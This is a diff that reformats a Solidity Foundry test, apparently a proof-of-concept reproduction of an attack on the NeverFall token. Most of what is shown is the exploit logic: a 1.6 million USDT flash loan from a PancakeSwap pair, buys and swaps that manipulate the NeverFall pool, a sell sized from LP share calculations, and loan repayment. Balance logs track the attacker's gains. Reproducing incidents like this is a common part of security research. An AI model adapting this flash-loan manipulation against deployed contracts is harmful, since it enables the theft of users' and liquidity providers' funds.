@@ -32,7 +32,11 @@ contract NeverFall2Exp is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("[Before Attack][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
+        emit log_named_decimal_uint(
+            "[Before Attack][Attacker]USDT balance",
+            IERC20(USDT).balanceOf(Attacker),
+            18
+        );
         emit log_named_decimal_uint(
             "[Before Attack][Attacker]NeverFall balance",
             IERC20(NeverFall).balanceOf(Attacker),
@@ -61,9 +65,18 @@ contract NeverFall2Exp is Test {
         console.log("----------------------------------------");
 
         uint256 flashLoanAmount = 1_600_000 * 1e18;
-        IUniswapV2Pair(BUSD_USDT_Pool).swap(flashLoanAmount, 0, Attacker, new bytes(1));
+        IUniswapV2Pair(BUSD_USDT_Pool).swap(
+            flashLoanAmount,
+            0,
+            Attacker,
+            new bytes(1)
+        );
 
-        emit log_named_decimal_uint("[After Attack][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
+        emit log_named_decimal_uint(
+            "[After Attack][Attacker]USDT balance",
+            IERC20(USDT).balanceOf(Attacker),
+            18
+        );
         emit log_named_decimal_uint(
             "[After Attack][Attacker]NeverFall balance",
             IERC20(NeverFall).balanceOf(Attacker),
@@ -91,14 +104,23 @@ contract NeverFall2Exp is Test {
         );
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
         (sender, amount1, data);
 
         IERC20(USDT).approve(NeverFall, type(uint256).max);
         IERC20(USDT).approve(PancakeRouter, type(uint256).max);
 
         INeverFall(NeverFall).buy(200_000 * 1e18);
-        emit log_named_decimal_uint("[Attacking 1][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
+        emit log_named_decimal_uint(
+            "[Attacking 1][Attacker]USDT balance",
+            IERC20(USDT).balanceOf(Attacker),
+            18
+        );
         emit log_named_decimal_uint(
             "[Attacking 1][Attacker]NeverFall balance",
             IERC20(NeverFall).balanceOf(Attacker),
@@ -129,7 +151,11 @@ contract NeverFall2Exp is Test {
         console.log("----------------------------------------");
 
         _swap(USDT, NeverFall, 1_400_000 * 1e18, NeverFallDeployer);
-        emit log_named_decimal_uint("[Attacking 2][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
+        emit log_named_decimal_uint(
+            "[Attacking 2][Attacker]USDT balance",
+            IERC20(USDT).balanceOf(Attacker),
+            18
+        );
         emit log_named_decimal_uint(
             "[Attacking 2][Attacker]NeverFall balance",
             IERC20(NeverFall).balanceOf(Attacker),
@@ -155,20 +181,32 @@ contract NeverFall2Exp is Test {
             IERC20(NeverFall).balanceOf(NeverFallDeployer),
             18
         );
-        uint256 NeedLPAmount = (IERC20(NeverFall).balanceOf(Attacker) * IERC20(NF_USDT_Pool).totalSupply()) /
+        uint256 NeedLPAmount = (IERC20(NeverFall).balanceOf(Attacker) *
+            IERC20(NF_USDT_Pool).totalSupply()) /
             INeverFall(NeverFall).balanceOf(NF_USDT_Pool);
         console.log(NeedLPAmount);
-        emit log_named_decimal_uint("Percentage", (NeverFallLPAmount * 1000) / NeedLPAmount, 3);
+        emit log_named_decimal_uint(
+            "Percentage",
+            (NeverFallLPAmount * 1000) / NeedLPAmount,
+            3
+        );
         console.log("----------------------------------------");
 
         uint256 sellFlag = NeverFallLPAmount / NeedLPAmount;
         if (sellFlag != 0) {
             INeverFall(NeverFall).sell(IERC20(NeverFall).balanceOf(Attacker));
         } else {
-            INeverFall(NeverFall).sell((IERC20(NeverFall).balanceOf(Attacker) * NeverFallLPAmount) / NeedLPAmount);
+            INeverFall(NeverFall).sell(
+                (IERC20(NeverFall).balanceOf(Attacker) * NeverFallLPAmount) /
+                    NeedLPAmount
+            );
         }
 
-        emit log_named_decimal_uint("[Attacking 3][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
+        emit log_named_decimal_uint(
+            "[Attacking 3][Attacker]USDT balance",
+            IERC20(USDT).balanceOf(Attacker),
+            18
+        );
         emit log_named_decimal_uint(
             "[Attacking 3][Attacker]NeverFall balance",
             IERC20(NeverFall).balanceOf(Attacker),
@@ -199,17 +237,23 @@ contract NeverFall2Exp is Test {
         IERC20(USDT).transfer(msg.sender, amount0 + (amount0 * 30) / 10_000);
     }
 
-    function _swap(address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
+    function _swap(
+        address tokenIn,
+        address tokenOut,
+        uint256 amountIn,
+        address to
+    ) internal {
         IERC20(tokenIn).approve(PancakeRouter, type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = tokenIn;
         path[1] = tokenOut;
-        IUniswapV2Router(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            to,
-            block.timestamp
-        );
+        IUniswapV2Router(payable(PancakeRouter))
+            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                amountIn,
+                0,
+                path,
+                to,
+                block.timestamp
+            );
     }
 }
